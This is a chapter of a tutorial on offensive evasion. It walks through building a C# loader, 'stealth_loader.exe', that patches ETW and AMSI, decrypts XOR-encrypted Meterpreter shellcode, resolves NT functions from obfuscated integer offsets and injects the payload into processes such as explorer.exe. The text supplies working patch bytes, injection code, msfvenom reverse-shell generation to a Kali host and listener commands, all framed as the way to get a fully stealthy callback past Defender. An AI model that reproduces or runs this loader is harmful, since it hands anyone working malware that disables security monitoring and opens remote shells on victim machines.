# Document 10: Combined Evasion - All Techniques in One Loader

## Where We Are

You finished Documents 05 through 09. You have built seven loaders:

- **Loader 01** (Document 05): Raw shellcode via DllImport. Caught by Defender.
- **Loader 02** (Document 06): XOR-encrypted shellcode. Encrypted file survived disk scanning, but the loader binary was caught.
- **Loader 03** (Document 07): Dynamic resolution, NT-level functions, two-step allocation, XOR encryption. First loader to survive Defender. You got a callback.
- **Loader 04** (Document 08): AMSI bypass. Patches AmsiScanBuffer to disable script scanning.
- **Loader 05** (Document 09): Remote thread injection into a running process. Caught by Defender alone.
- **Loader 06** (Document 09): Early Bird APC injection into a suspended process. Caught by Defender alone.
- **Loader 07** (Document 08): ETW patch. Patches NtTraceEvent to stop telemetry.

Each loader teaches one or two techniques. Each technique defeats one or two of Defender's detection layers. But no single technique defeats all six layers. This document combines everything into Loader 08, the final loader that addresses all six detection layers in the correct order and gives you a fully stealthy callback with Defender at full defaults.

Your C# knowledge at this point:

- DllImport, P/Invoke, delegates, generic methods
- VirtualAlloc, Marshal.Copy, VirtualProtect, CreateThread
- GetModuleHandle, GetProcAddress, LoadLibrary for dynamic resolution
- Building strings from integer offsets, building bytes from arithmetic
- XOR encryption and decryption
- NT-level functions: NtAllocateVirtualMemory, NtProtectVirtualMemory, NtCreateThreadEx, NtWaitForSingleObject, NtWriteVirtualMemory
- Patching system functions (AmsiScanBuffer, NtTraceEvent)
- Cross-process operations: OpenProcess, VirtualAllocEx, WriteProcessMemory, CreateRemoteThread
- APC queuing: CreateProcess(SUSPENDED), QueueUserAPC, ResumeThread

Your lab: dev box (ammulu, 192.168.10.150) for compiling (Defender disabled), target (kimjongun, 192.168.10.100) with Defender at full defaults, Kali (192.168.10.200) for shellcode and listeners.

## Why This Is Next

You have all the pieces. Now you put them together.

Loader 03 survived Defender by combining XOR encryption, dynamic resolution, NT-level functions, and two-step allocation. It addressed three of Defender's six detection layers (static scanning, import table analysis, behavioral ML) and left three layers active (AMSI, ETW, API hooks). It worked because the remaining three layers did not catch it at default sensitivity.

But default sensitivity can change. Defender updates its signatures and behavioral models regularly. A loader that barely passes today might get caught after the next Defender update. Loader 08 does not rely on barely passing. It actively disables two of the three remaining layers (ETW and AMSI) and uses NT functions to reduce the impact of the third (API hooks). This gives you a much wider margin of safety.

Loader 08 also adds process injection. Loaders 05 and 06 showed you how to inject shellcode into another process, but Defender caught them because they used DllImport for all their API calls and generated ETW telemetry. Loader 08 combines injection with ETW patching and dynamic resolution, so the injection is not visible to Defender.

The result: your shellcode runs inside a legitimate process (like explorer.exe), with no ETW telemetry, no AMSI scanning, no suspicious import table, and no static signatures. This is the fully stealthy loader.

## How This Works

### Why Order Matters

Each evasion technique you learned disables or avoids one of Defender's detection layers. But some of those layers watch what other layers are doing. If you disable AMSI before disabling ETW, the act of patching AMSI generates telemetry events through ETW, and Defender reads those events and sees that something tampered with AMSI. If you decrypt your shellcode before disabling AMSI, the decrypted bytes pass through AMSI's scanner and might get flagged. Each step in the evasion chain needs the previous step to have already cleared the way.

Defender's six detection layers are not independent. They are connected, and some layers feed information to other layers. ETW sends telemetry that the behavioral ML model uses to make detection decisions. If AMSI catches something, it generates an ETW event. If an API hook catches something, it also generates an ETW event. Patching ETW first cuts off that information flow, so when you patch AMSI next, there is no telemetry system left to report what you just did. When you decrypt shellcode after that, there is no AMSI scanner left to inspect the decrypted bytes. The order creates a cascade where each step makes the next step safe.

### The Execution Order

Loader 08 executes in this exact sequence:

```
Step 1: Patch ETW (EtwEventWrite in ntdll.dll)
   ↓    Telemetry is now dead. Defender receives no more events.
Step 2: Patch AMSI (AmsiScanBuffer in amsi.dll)
   ↓    The AMSI patch is not logged because ETW is already dead.
Step 3: Decrypt shellcode (XOR decryption in memory)
   ↓    Shellcode exists only in memory, never on disk.
Step 4: Resolve NT functions dynamically (GetProcAddress at runtime)
   ↓    No suspicious function names in the import table.
Step 5: Allocate memory (RW first, then RX)
   ↓    Two-step allocation avoids the suspicious RWX pattern.
Step 6: Execute shellcode (local thread or remote injection)
   ↓    Code runs. Meterpreter connects back to Kali.
```

If you change this order, things break:

- If you patch AMSI before ETW, the AMSI patching generates ETW events that Defender reads. Defender sees "process modified amsi.dll memory" and flags it.
- If you resolve functions before patching ETW, the resolution process generates ETW events that tell Defender which NT functions you are looking up. Defender sees "process is resolving NtAllocateVirtualMemory, NtCreateThreadEx" and raises the behavioral score.
- If you decrypt shellcode before patching AMSI, and AMSI happens to inspect your decryption routine, it could catch the shellcode bytes in managed memory before they are moved to unmanaged memory.

The order in Loader 08 is designed so each step creates the conditions needed for the next step to succeed.

### What Each Step Defeats

| Step | Technique | Detection layer it defeats |
|---|---|---|
| 1 | ETW patch | ETW telemetry (Defender's behavioral monitoring) |
| 2 | AMSI patch | AMSI runtime scanning (script and .NET code scanning) |
| 3 | XOR decryption | Static file scanning (signature matching on disk) |
| 4 | Dynamic resolution | Import table analysis (PE header inspection) |
| 5 | Two-step allocation | Behavioral ML (the RWX memory pattern is a high-confidence signal) |
| 6 | NT functions | API hooks in ntdll.dll (reduces hook trigger probability) |

After all six steps, Defender's remaining detection capability is:

- **Kernel-mode ETW** (Microsoft-Windows-Threat-Intelligence provider): runs in the kernel, cannot be patched from user mode. Default Defender does not heavily rely on this for general detection.
- **Cloud-based ML analysis**: Defender can send binary metadata to Microsoft's cloud service for deeper analysis. The binary needs to trigger a cloud submission first, which the clean import table and lack of static signatures make unlikely.
- **Periodic memory scanning**: Defender periodically scans process memory for known patterns. If you inject into a long-running process and the Meterpreter payload generates recognizable patterns in memory, a periodic scan could catch it later. This is a race against time.

### Local vs Remote Execution

Loader 08 has two modes:

**Local mode** (no target process specified): The shellcode runs in the loader's own process. This is simpler and more reliable. The downside is that your binary (stealth_loader.exe) is the process making the network connection. If a security analyst checks running processes, an unknown binary making outbound connections is suspicious.

**Remote mode** (target process specified): The shellcode is injected into another process using NT functions resolved dynamically. Instead of using kernel32's WriteProcessMemory (which Defender hooks), Loader 08 uses NtWriteVirtualMemory from ntdll.dll, resolved via GetProcAddress. The shellcode runs inside the target process (explorer.exe, svchost.exe, etc.), and the network connection comes from that process instead of your binary.

Remote mode is more evasive but requires administrator privileges to inject into system processes.

### The NT Functions Used in Remote Mode

Loader 08 uses five NT functions for remote injection:

| NT function | What it does | Replaces |
|---|---|---|
| NtAllocateVirtualMemory | Allocates memory in the target process | VirtualAllocEx |
| NtWriteVirtualMemory | Writes bytes to the target process | WriteProcessMemory |
| NtProtectVirtualMemory | Changes memory protection in the target process | VirtualProtectEx |
| NtCreateThreadEx | Creates a thread in the target process | CreateRemoteThread |
| OpenProcess (resolved dynamically) | Opens a handle to the target process | OpenProcess via DllImport |

All five are resolved at runtime via GetProcAddress. Their names are built from integer offsets. None appear in the binary's import table.

## What Defender Does

Here is the complete picture of how Defender's six layers interact with Loader 08:

| Layer | What it checks | Loader 08's response | Result |
|---|---|---|---|
| Static file scanning | Binary on disk, shellcode on disk | Binary has clean imports and no suspicious strings. Shellcode is XOR-encrypted. | **BYPASSED** |
| Import table analysis | Function names in PE header | Only GetModuleHandle, GetProcAddress, LoadLibrary, VirtualProtect, CloseHandle in imports. All legitimate. | **BYPASSED** |
| AMSI | .NET code at runtime | AmsiScanBuffer patched to return E_INVALIDARG. No scanning occurs. | **BYPASSED** |
| ETW telemetry | Process behavior events | EtwEventWrite patched to return STATUS_SUCCESS without logging. No events generated. | **BYPASSED** |
| API hooks in ntdll.dll | Intercepts API calls | NT functions resolved dynamically, called via delegates. Hooks may see calls but import table is clean, ETW is dead. | **REDUCED** |
| Behavioral ML | Scores combined behavior | Two-step allocation, clean imports, no ETW events to analyze. ML score stays below threshold. | **BYPASSED** |

Five layers are fully bypassed. The sixth (API hooks) is reduced in effectiveness because the hooks have no ETW telemetry to correlate with and the import table provides no supporting evidence. The behavioral ML model needs multiple signals to reach a high-confidence detection, and with ETW dead and imports clean, there are not enough signals.

## The Evasion Technique

Loader 08 is not a new technique. It is the correct combination of all the techniques you have learned, applied in the right order with the right implementation details. The evasion comes from the combination, not from any single step.

Here is what makes the combination work:

1. **Each technique covers for another technique's weakness.** XOR encryption hides shellcode from disk scanning, but the loader binary still has suspicious imports. Dynamic resolution fixes the imports, but ETW logs the API calls. ETW patching silences the logs, but Defender could detect the patching through AMSI. AMSI patching prevents that, but the patching itself generates ETW events. Patching ETW first prevents that.

2. **The import table tells a neutral story.** The only DllImport functions in Loader 08 are GetModuleHandle, GetProcAddress, LoadLibrary, VirtualProtect, and CloseHandle. These are used by thousands of legitimate programs. There is nothing in the import table that says "this is a hacking tool".

3. **No static signatures.** Every function name, DLL name, and patch byte sequence is built from arithmetic at runtime. The compiled binary contains integer arrays, not recognizable strings or byte patterns. YARA rules and static scanners cannot match what is not there.

4. **Clean memory operations.** Two-step allocation (RW then RX instead of single RWX) matches the pattern of legitimate programs that do just-in-time compilation. The .NET CLR itself allocates memory this way.

5. **Selective disclosure.** In remote mode, the loader process does the patching and decryption, but the shellcode runs in a different process. If a security tool examines the loader process, it finds patches applied to ETW and AMSI (which are suspicious), but the shellcode is not there. If it examines the target process, it finds the shellcode running, but that process has its own unpatched copies of ETW and AMSI (each process loads its own DLLs). The malicious activity is split across two processes.

## Getting the Loader Onto the Target

### What You Need

1. **stealth_loader.exe**: the compiled Loader 08 binary
2. **encrypted.bin**: XOR-encrypted shellcode (from Document 06)
3. **The XOR key**: the hex string from the encoder

### Full Workflow (All Three Machines)

**On Kali (192.168.10.200), generate shellcode** if you do not already have it:
```bash
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.10.200 LPORT=4444 -f raw -o payload.bin
```

Start a Python HTTP server on Kali to serve the shellcode to the dev box:
```bash
python3 -m http.server 8080
```

**On the dev box (ammulu, 192.168.10.150)**, download the shellcode from Kali:
```powershell
Invoke-WebRequest -Uri "http://192.168.10.200:8080/payload.bin" -OutFile "C:\Users\ammulu\Desktop\payload.bin"
```

Encrypt it with the XOR encoder from Document 06:
```
cd C:\Users\ammulu\Desktop
xor_encode.exe payload.bin encrypted.bin
```

Write down the printed XOR key.

Compile Loader 08:
```
dotnet publish Loader08 -c Release -r win-x64 --self-contained false /p:PublishSingleFile=true -o output/
```

Host stealth_loader.exe and encrypted.bin on the dev box:
```
python -m http.server 8080
```

**On the target (kimjongun, 192.168.10.100)**, download both files:
```powershell
Invoke-WebRequest -Uri "http://192.168.10.150:8080/stealth_loader.exe" -OutFile "C:\Users\kimjongun\Desktop\stealth_loader.exe"
Invoke-WebRequest -Uri "http://192.168.10.150:8080/encrypted.bin" -OutFile "C:\Users\kimjongun\Desktop\encrypted.bin"
```

Defender scans both files when they hit the disk. stealth_loader.exe has a clean import table (GetModuleHandle, GetProcAddress, LoadLibrary, VirtualProtect, CloseHandle) and no suspicious strings in its data section. The encrypted.bin file is XOR-scrambled and matches no known signatures. Both files survive Defender's static scan.

**AMSI implications:** When the .NET CLR loads stealth_loader.exe, AMSI inspects the managed assembly. The managed code does not contain any known malicious patterns (no shellcode byte arrays, no Invoke-Mimikatz strings). AMSI allows it. Once the loader runs, step 2 patches AMSI for the rest of the process's lifetime.

**ETW considerations:** Before step 1 runs, the loader is generating ETW events normally. The events for the initial .NET CLR loading, process startup, and module loading are visible to Defender. But these events describe a normal .NET application starting up, which is not suspicious. Once step 1 patches EtwEventWrite, all subsequent operations (AMSI patching, memory allocation, thread creation, network connections) generate no events.

**Process tree:** When you run stealth_loader.exe from cmd.exe, Defender sees cmd.exe as the parent and stealth_loader.exe as the child. In remote mode, the shellcode then runs inside the target process (explorer.exe), and the network connection originates from that process. The process tree does not show a direct connection between stealth_loader.exe and the Meterpreter session.

**Reference file:** `lab/loaders/08_combined_evasion.cs`

## Teaching the Code

Loader 08 reuses code patterns from Loaders 03, 04, and 07 that you have already learned. This section focuses on what is new and different in the combined loader.

### The Import List

```csharp
[DllImport("kernel32.dll", CharSet = CharSet.Unicode, SetLastError = true)]
static extern IntPtr GetModuleHandle(string lpModuleName);

[DllImport("kernel32.dll", CharSet = CharSet.Ansi, SetLastError = true)]
static extern IntPtr GetProcAddress(IntPtr hModule, string procName);

[DllImport("kernel32.dll", SetLastError = true)]
static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect);

[DllImport("kernel32.dll", CharSet = CharSet.Unicode, SetLastError = true)]
static extern IntPtr LoadLibrary(string lpFileName);

[DllImport("kernel32.dll", SetLastError = true)]
static extern bool CloseHandle(IntPtr hObject);
```

Five imports, all from kernel32.dll, all completely standard. GetModuleHandle and GetProcAddress are the same two imports from Loader 03. LoadLibrary is used for loading amsi.dll (same as Loader 04). VirtualProtect is used for changing memory protection when applying the ETW and AMSI patches. CloseHandle releases process and thread handles after remote injection.

When C# compiles each DllImport line, it writes the function name directly into the .exe file on your hard drive in the import table section. You can open Loader 08's compiled .exe in Notepad right now and you will literally see "GetModuleHandle", "GetProcAddress", "LoadLibrary", "VirtualProtect", "CloseHandle" sitting there as readable text inside all the garbage characters. Defender opens that .exe, reads the whole thing from start to end, and that combination matches nothing suspicious in its database. Compare this to Loader 05, where "OpenProcess", "VirtualAllocEx", "WriteProcessMemory", "CreateRemoteThread" were all sitting there in the same import table as readable text, and Defender matched that cluster as a process injection tool immediately. Loader 08 hides all the injection-related functions behind dynamic resolution at runtime, so their names never appear in the .exe file on your hard drive.

### OpenProcess via Dynamic Resolution

```csharp
[UnmanagedFunctionPointer(CallingConvention.StdCall)]
delegate IntPtr ProcessOpenDelegate(uint dwDesiredAccess, bool bInheritHandle, int dwProcessId);

static IntPtr ResolveAndCall(uint access, bool inherit, int pid)
{
    IntPtr k32 = GetModuleHandle(FromOffsets(32, 75,69,82,78,69,76,19,18,14,68,76,76));
    IntPtr addr = GetProcAddress(k32, FromOffsets(32, 47,80,69,78,48,82,79,67,69,83,83));
    var fn = (ProcessOpenDelegate)Marshal.GetDelegateForFunctionPointer(addr, typeof(ProcessOpenDelegate));
    return fn(access, inherit, pid);
}
```

This is a new pattern not in previous loaders. In Loader 05, OpenProcess was imported via DllImport, which meant the word "OpenProcess" was written into the .exe file on your hard drive as readable text. In Loader 08, OpenProcess is resolved at runtime:

1. GetModuleHandle finds kernel32.dll using the name built from offsets: base 32 plus offsets [75,69,82,78,69,76,19,18,14,68,76,76] produces "kernel32.dll". Let us verify: 32+75=107='k', 32+69=101='e', 32+82=114='r', 32+78=110='n', 32+69=101='e', 32+76=108='l', 32+19=51='3', 32+18=50='2', 32+14=46='.', 32+68=100='d', 32+76=108='l', 32+76=108='l'. That spells "kernel32.dll".

2. GetProcAddress finds OpenProcess inside kernel32.dll. The name is built from offsets: 32+47=79='O', 32+80=112='p', 32+69=101='e', 32+78=110='n', 32+48=80='P', 32+82=114='r', 32+79=111='o', 32+67=99='c', 32+69=101='e', 32+83=115='s', 32+83=115='s'. That spells "OpenProcess".

3. Marshal.GetDelegateForFunctionPointer creates a callable delegate from the function address.

4. The delegate is called immediately with the access flags, inherit flag, and PID.

The result is that "OpenProcess" is assembled in the computer's RAM at runtime and never written into the .exe file on your hard drive as text. You can open the compiled .exe in Notepad right now and you will never see "OpenProcess" sitting there because it is never stored as a string. Defender opens that .exe, reads the whole thing from start to end, and only finds "GetModuleHandle" and "GetProcAddress" in the import table, both of which appear in thousands of normal programs and match nothing suspicious in Defender's database.

### The NT Function Delegates

```csharp
[UnmanagedFunctionPointer(CallingConvention.StdCall)]
delegate int MemAllocDelegate(IntPtr ProcessHandle, ref IntPtr BaseAddress, IntPtr ZeroBits, ref IntPtr RegionSize, uint AllocationType, uint Protect);

[UnmanagedFunctionPointer(CallingConvention.StdCall)]
delegate int MemWriteDelegate(IntPtr ProcessHandle, IntPtr BaseAddress, byte[] Buffer, uint NumberOfBytesToWrite, out uint NumberOfBytesWritten);

[UnmanagedFunctionPointer(CallingConvention.StdCall)]
delegate int MemProtectDelegate(IntPtr ProcessHandle, ref IntPtr BaseAddress, ref IntPtr RegionSize, uint NewProtect, out uint OldProtect);

[UnmanagedFunctionPointer(CallingConvention.StdCall)]
delegate int ThreadCreateDelegate(out IntPtr ThreadHandle, uint DesiredAccess, IntPtr ObjectAttributes, IntPtr ProcessHandle, IntPtr StartRoutine, IntPtr Argument, uint CreateFlags, IntPtr ZeroBits, IntPtr StackSize, IntPtr MaximumStackSize, IntPtr AttributeList);

[UnmanagedFunctionPointer(CallingConvention.StdCall)]
delegate int WaitObjectDelegate(IntPtr Handle, bool Alertable, IntPtr Timeout);
```

You have seen MemAllocDelegate, MemProtectDelegate, ThreadCreateDelegate, and WaitObjectDelegate in Loader 03. The new one is MemWriteDelegate, which represents NtWriteVirtualMemory. This function writes bytes from your process into another process's memory, the same thing WriteProcessMemory does but at the NT level. The delegate takes a ProcessHandle (the target process), BaseAddress (where to write in the target), Buffer (the bytes to write), NumberOfBytesToWrite, and NumberOfBytesWritten (how many bytes were actually written). Because these are delegate types rather than DllImport declarations, none of the function names "NtWriteVirtualMemory", "NtAllocateVirtualMemory", "NtProtectVirtualMemory", "NtCreateThreadEx", or "NtWaitForSingleObject" get written into the .exe file on your hard drive. Defender reads the whole file from start to end and those names are simply not there.

### The ETW Patch in Loader 08

```csharp
static bool PatchTelemetry()
{
    Console.WriteLine("[1/6] Patching telemetry...");

    IntPtr ntdll = GetModuleHandle(FromOffsets(32, 78,84,68,76,76));
    if (ntdll == IntPtr.Zero) return false;

    string funcName = FromOffsets(32, 37,84,87,37,86,69,78,84,55,82,73,84,69);
    IntPtr funcAddr = GetProcAddress(ntdll, funcName);
    if (funcAddr == IntPtr.Zero) return false;

    uint oldProtect;
    if (!VirtualProtect(funcAddr, (UIntPtr)3, GetRWXProtect(), out oldProtect))
        return false;

    byte[] patch = new byte[3];
    patch[0] = (byte)(0x19 + 0x1A);
    patch[1] = (byte)(0x60 + 0x60);
    patch[2] = (byte)(0x61 + 0x62);
    Marshal.Copy(patch, 0, funcAddr, patch.Length);

    uint ignored;
    VirtualProtect(funcAddr, (UIntPtr)3, oldProtect, out ignored);

    Console.WriteLine("      Telemetry patched. No events from this process.");
    return true;
}
```

This is the same ETW patch from Loader 07 but condensed. No explanation comments because those are in the standalone loader. The output is labeled "[1/6]" to show the student where this step falls in the six-step execution order.

### The AMSI Patch in Loader 08

```csharp
static bool PatchScanner()
{
    Console.WriteLine("[2/6] Patching scanner...");

    string dllName = FromOffsets(32, 65,77,83,73,14,68,76,76);
    IntPtr amsiDll = LoadLibrary(dllName);
    if (amsiDll == IntPtr.Zero) return false;

    string funcName = FromOffsets(32, 33,77,83,73,51,67,65,78,34,85,70,70,69,82);
    IntPtr funcAddr = GetProcAddress(amsiDll, funcName);
    if (funcAddr == IntPtr.Zero) return false;

    uint oldProtect;
    if (!VirtualProtect(funcAddr, (UIntPtr)6, GetRWXProtect(), out oldProtect))
        return false;

    byte[] patch = new byte[6];
    patch[0] = (byte)(0x5C + 0x5C);
    patch[1] = (byte)(0x2B + 0x2C);
    patch[2] = (byte)(0x00);
    patch[3] = (byte)(0x03 + 0x04);
    patch[4] = (byte)(0x40 + 0x40);
    patch[5] = (byte)(0x61 + 0x62);
    Marshal.Copy(patch, 0, funcAddr, patch.Length);

    uint ignored;
    VirtualProtect(funcAddr, (UIntPtr)6, oldProtect, out ignored);

    Console.WriteLine("      Scanner patched. Content inspection disabled.");
    return true;
}
```

Similar goal to Loader 04 (disable AMSI by patching AmsiScanBuffer), but the implementation differs. Loader 08 uses VirtualProtect via DllImport and applies a 6-byte E_INVALIDARG return patch. Loader 04 avoids VirtualProtect entirely and writes only a single 0xC3 byte via an indirect NtProtectVirtualMemory syscall stub. The reason Loader 08 can afford to have "VirtualProtect" sitting as readable text in the .exe file on your hard drive is that by the time this function runs, the ETW patch has already silenced the detection signal that VirtualProtect's presence would normally trigger. Defender would usually notice VirtualProtect being called on a system DLL's memory page through ETW telemetry, but with ETW already patched in step 1, no telemetry gets through. Labeled "[2/6]" in the output.

### The Main Function: The Orchestrator

```csharp
static void Main(string[] args)
{
    if (args.Length < 2)
    {
        Console.WriteLine("Stealth Runner");
        Console.WriteLine("Usage: runner.exe <data.bin> <key_hex> [target]");
        Console.WriteLine("");
        Console.WriteLine("  data.bin:   encrypted data file");
        Console.WriteLine("  key_hex:    decryption key");
        Console.WriteLine("  target:     optional target process name");
        return;
    }

    string dataPath = args[0];
    string keyHex = args[1];
    string targetProcess = args.Length >= 3 ? args[2] : null;
```

The usage shows two modes. Without a third argument, the loader runs shellcode in its own process (local mode). With a third argument (a process name like "explorer"), it injects into that process (remote mode).

```csharp
    // Step 1: Patch ETW
    if (!PatchTelemetry())
    {
        Console.WriteLine("[-] Telemetry patch failed. Continuing anyway (higher detection risk).");
    }

    // Step 2: Patch AMSI
    if (!PatchScanner())
    {
        Console.WriteLine("[-] Scanner patch failed. Continuing anyway (scripts may be blocked).");
    }
```

Both patches are applied at the start. If either fails, the loader prints a warning but continues. The patches are not strictly required for the shellcode to execute (Loader 03 worked without them), but they provide additional evasion layers. A failed patch increases detection risk but does not prevent execution.

```csharp
    // Step 3: Decrypt
    Console.WriteLine("[3/6] Decrypting data...");
    byte[] encrypted = File.ReadAllBytes(dataPath);
    byte[] key = HexToBytes(keyHex);
    byte[] data = TransformData(encrypted, key);

    Array.Clear(encrypted, 0, encrypted.Length);
    Console.WriteLine("      Decrypted " + data.Length + " bytes in memory.");
```

Read the encrypted shellcode from disk and XOR-decrypt it in memory. Clear the encrypted copy immediately. At this point, the decrypted shellcode exists only in the managed byte array `data`. It will be copied to unmanaged memory in the next step and then cleared from managed memory.

```csharp
    // Steps 4-6: Execute
    if (targetProcess != null)
    {
        ExecuteRemote(data, targetProcess);
    }
    else
    {
        ExecuteLocal(data);
    }
```

Branch to local or remote execution based on whether a target process was specified.

### Local Execution (ExecuteLocal)

```csharp
static void ExecuteLocal(byte[] data)
{
    IntPtr currentProcess = (IntPtr)(-1);

    Console.WriteLine("[4/6] Resolving NT functions...");
    var ntAlloc = ResolveNtFunction<MemAllocDelegate>(
        FromOffsets(32, 46,84,33,76,76,79,67,65,84,69,54,73,82,84,85,65,76,45,69,77,79,82,89));
    var ntProtect = ResolveNtFunction<MemProtectDelegate>(
        FromOffsets(32, 46,84,48,82,79,84,69,67,84,54,73,82,84,85,65,76,45,69,77,79,82,89));
    var ntCreateThread = ResolveNtFunction<ThreadCreateDelegate>(
        FromOffsets(32, 46,84,35,82,69,65,84,69,52,72,82,69,65,68,37,88));
    var ntWait = ResolveNtFunction<WaitObjectDelegate>(
        FromOffsets(32, 46,84,55,65,73,84,38,79,82,51,73,78,71,76,69,47,66,74,69,67,84));
    Console.WriteLine("      Functions resolved.");
```

This is the same function resolution from Loader 03. Four NT functions are resolved dynamically, their names built from integer offsets. `(IntPtr)(-1)` is the NT handle for "the current process".

```csharp
    Console.WriteLine("[5/6] Allocating memory...");
    IntPtr baseAddr = IntPtr.Zero;
    IntPtr regionSize = (IntPtr)data.Length;
    int status = ntAlloc(currentProcess, ref baseAddr, IntPtr.Zero, ref regionSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);

    Marshal.Copy(data, 0, baseAddr, data.Length);
    Array.Clear(data, 0, data.Length);

    IntPtr protAddr = baseAddr;
    IntPtr protSize = regionSize;
    uint oldProt;
    ntProtect(currentProcess, ref protAddr, ref protSize, PAGE_EXECUTE_READ, out oldProt);
    Console.WriteLine("      Memory ready (RW -> RX).");
```

Allocate memory as PAGE_READWRITE, copy the shellcode, clear the managed copy, then change protection to PAGE_EXECUTE_READ. Two-step allocation, same as Loader 03.

```csharp
    Console.WriteLine("[6/6] Executing code...");
    IntPtr threadHandle;
    status = ntCreateThread(out threadHandle, THREAD_ALL_ACCESS, IntPtr.Zero, currentProcess, baseAddr, IntPtr.Zero, 0, IntPtr.Zero, IntPtr.Zero, IntPtr.Zero, IntPtr.Zero);

    Console.WriteLine("      Code running.");
    ntWait(threadHandle, false, IntPtr.Zero);
}
```

Create a thread at the shellcode's address and wait for it. The shellcode (Meterpreter) establishes a connection to Kali and the wait keeps the process alive.

### Remote Execution (ExecuteRemote)

```csharp
static void ExecuteRemote(byte[] data, string targetProcessName)
{
    Console.WriteLine("[4/6] Finding target process: " + targetProcessName + "...");
    Process[] procs = Process.GetProcessesByName(targetProcessName);
    if (procs.Length == 0)
    {
        Console.WriteLine("      [-] Process not found.");
        return;
    }

    int targetPid = procs[0].Id;
    Console.WriteLine("      Found PID: " + targetPid);
```

Find the target process by name. Same as Loader 05.

```csharp
    IntPtr processHandle = ResolveAndCall(PROCESS_ALL_ACCESS, false, targetPid);
    if (processHandle == IntPtr.Zero)
    {
        Console.WriteLine("      [-] Could not open process. Need admin privileges.");
        return;
    }
```

Open the target process using OpenProcess resolved dynamically (via ResolveAndCall). Unlike Loader 05 which used DllImport, this does not put OpenProcess in the import table.

```csharp
    var ntAlloc = ResolveNtFunction<MemAllocDelegate>(
        FromOffsets(32, 46,84,33,76,76,79,67,65,84,69,54,73,82,84,85,65,76,45,69,77,79,82,89));
    var ntWrite = ResolveNtFunction<MemWriteDelegate>(
        FromOffsets(32, 46,84,55,82,73,84,69,54,73,82,84,85,65,76,45,69,77,79,82,89));
    var ntProtect = ResolveNtFunction<MemProtectDelegate>(
        FromOffsets(32, 46,84,48,82,79,84,69,67,84,54,73,82,84,85,65,76,45,69,77,79,82,89));
    var ntCreateThread = ResolveNtFunction<ThreadCreateDelegate>(
        FromOffsets(32, 46,84,35,82,69,65,84,69,52,72,82,69,65,68,37,88));
```

Resolve four NT functions. NtWriteVirtualMemory (ntWrite) is new compared to local mode. In local mode, you use Marshal.Copy to write shellcode to your own process memory. In remote mode, you need NtWriteVirtualMemory to write shellcode to another process's memory.

```csharp
    Console.WriteLine("[5/6] Writing to " + targetProcessName + "...");
    IntPtr baseAddr = IntPtr.Zero;
    IntPtr regionSize = (IntPtr)data.Length;
    int status = ntAlloc(processHandle, ref baseAddr, IntPtr.Zero, ref regionSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
```

Allocate memory in the target process. Notice that `processHandle` (the target process handle) is passed instead of `currentProcess`. NtAllocateVirtualMemory can allocate memory in any process you have a handle to with sufficient access rights.

```csharp
    uint bytesWritten;
    status = ntWrite(processHandle, baseAddr, data, (uint)data.Length, out bytesWritten);

    Array.Clear(data, 0, data.Length);
```

Write the shellcode to the target process using NtWriteVirtualMemory. This is the NT-level equivalent of WriteProcessMemory. Because it is resolved dynamically, WriteProcessMemory never appears in the import table. Clear the managed copy after writing.

```csharp
    IntPtr protAddr = baseAddr;
    IntPtr protSize = regionSize;
    uint oldProt;
    ntProtect(processHandle, ref protAddr, ref protSize, PAGE_EXECUTE_READ, out oldProt);

    Console.WriteLine("[6/6] Creating remote thread...");
    IntPtr threadHandle;
    status = ntCreateThread(out threadHandle, THREAD_ALL_ACCESS, IntPtr.Zero, processHandle, baseAddr, IntPtr.Zero, 0, IntPtr.Zero, IntPtr.Zero, IntPtr.Zero, IntPtr.Zero);

    Console.WriteLine("      Code running inside " + targetProcessName + " (PID " + targetPid + ").");
    CloseHandle(threadHandle);
    CloseHandle(processHandle);
}
```

Change the remote memory to executable, create a remote thread in the target process, and close the handles. NtCreateThreadEx works on remote processes the same way it works on the current process. The difference is the ProcessHandle parameter: pass your own process handle for local, pass the target process handle for remote.

After this, the shellcode is running inside the target process. Your Meterpreter session connects back to Kali from the target process's context.

### The Complete Combined Evasion Loader

The full source code is at `lab/loaders/08_combined_evasion.cs`.

## Compilation and Execution

### Step 1: Generate and Encrypt Shellcode

On Kali (192.168.10.200):
```bash
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.10.200 LPORT=4444 -f raw -o payload.bin
python3 -m http.server 8080
```

On the dev box (ammulu, 192.168.10.150):
```powershell
Invoke-WebRequest -Uri "http://192.168.10.200:8080/payload.bin" -OutFile "C:\Users\ammulu\Desktop\payload.bin"
```

Encrypt with the XOR encoder from Document 06:
```
cd C:\Users\ammulu\Desktop
xor_encode.exe payload.bin encrypted.bin
```

Save the printed XOR key.

### Step 2: Compile Loader 08 on the Dev Box

On the dev box (ammulu, 192.168.10.150), open the Developer Command Prompt for Visual Studio 2022:

```
dotnet publish Loader08 -c Release -r win-x64 --self-contained false /p:PublishSingleFile=true -o output/
```

Expected output: the compiler produces stealth_loader.exe with no errors.

### Step 3: Transfer to the Target

On the dev box (ammulu):
```
cd C:\Users\ammulu\Desktop
python -m http.server 8080
```

On the target (kimjongun, 192.168.10.100):
```powershell
Invoke-WebRequest -Uri "http://192.168.10.150:8080/stealth_loader.exe" -OutFile "C:\Users\kimjongun\Desktop\stealth_loader.exe"
Invoke-WebRequest -Uri "http://192.168.10.150:8080/encrypted.bin" -OutFile "C:\Users\kimjongun\Desktop\encrypted.bin"
```

Both files survive Defender's disk scan.

### Step 4: Set Up Listener on Kali

On Kali (192.168.10.200):
```bash
msfconsole -q
use exploit/multi/handler
set payload windows/x64/meterpreter/reverse_tcp
set LHOST 192.168.10.200
set LPORT 4444
run
```

### Step 5a: Run in Local Mode

On the target (kimjongun, 192.168.10.100):
```
cd C:\Users\kimjongun\Desktop
stealth_loader.exe encrypted.bin 4A7F2B9DE3A1C084F56D1B8E97320AF6
```

Replace the hex key with your actual XOR key.

Expected output:
```
=== Stealth Runner ===

[1/6] Patching telemetry...
      Telemetry patched. No events from this process.
[2/6] Patching scanner...
      Scanner patched. Content inspection disabled.
[3/6] Decrypting data...
      Decrypted 510 bytes in memory.
[4/6] Resolving NT functions...
      Functions resolved.
[5/6] Allocating memory...
      Memory ready (RW -> RX).
[6/6] Executing code...
      Code running.
```

On your Kali listener:
```
[*] Sending stage (201798 bytes) to 192.168.10.100
